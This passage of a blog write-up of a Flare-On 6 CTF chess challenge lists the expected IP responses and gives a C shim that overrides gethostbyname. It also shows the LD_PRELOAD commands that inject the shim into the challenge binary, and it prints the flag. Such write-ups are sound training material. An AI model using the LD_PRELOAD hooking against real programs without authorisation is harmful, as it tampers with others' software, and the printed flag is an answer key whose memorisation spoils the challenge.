&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  14 &#x2551; 127.99.253.122  &#x2551; queen-d1-h5.game-of-thrones.flare-on.com  &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  15 &#x2551; 127.141.14.174  &#x2551; queen-h5-f7.game-of-thrones.flare-on.com  &#x2551;
&#x255A;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2569;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2569;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x255D;
</pre><!--kg-card-end: html--><p>For example, our first move will be to move the pawn from d2 to d4. Now all that is left is to modify <code>gethostbyname.c</code> &#xA0;such that it also returns the response in the correct order.</p><pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

unsigned char ip_list[16][4] = {
{127,53,176,56}, {127,215,177,38}, {127,159,162,42}, {127,182,147,24}, {127,252,212,90}, {127,217,37,102}, {127,89,38,84}, {127,230,231,104}, {127,108,24,10}, {127,34,217,88}, {127,25,74,92}, {127,49,59,14}, {127,200,76,108}, {127,99,253,122}, {127,141,14,174}};

struct hostent 
{
    char  *h_name;            /* official name of host */
    char **h_aliases;         /* alias list */
    int    h_addrtype;        /* host address type */
    int    h_length;          /* length of address */
    char **h_addr_list;       /* list of addresses */
}_hostent;

int idx = 0;

void* addr_list[] = {NULL, NULL};

struct hostent *gethostbyname(char *name)
{
	addr_list[0] = &amp;ip_list[idx++];
	_hostent.h_addr_list = addr_list; 
	return &amp;_hostent;
}</code></pre><p>We can compile and <code>LD_PRELOAD</code> it the same way.</p><pre><code>$ gcc -Wall -fPIC -shared -o gethostbyname gethostbyname.c
$ LD_PRELOAD=./gethostbyname ./ChessUI</code></pre><h3 id="winning-the-game">Winning the game</h3><p>Let&apos;s play the game executing the moves in the order specified in the table.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-35.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 10: The Endgame</figcaption></figure><p>Playing out all 15 moves we win and reach the stage as shown in Figure 15. The flag is also printed.</p><p>FLAG: <a><code>LooksLikeYouLockedUpTheLookupZ@flare-on.com</code></a></p>]]></content:encoded>
    </item>
  </channel>
</rss>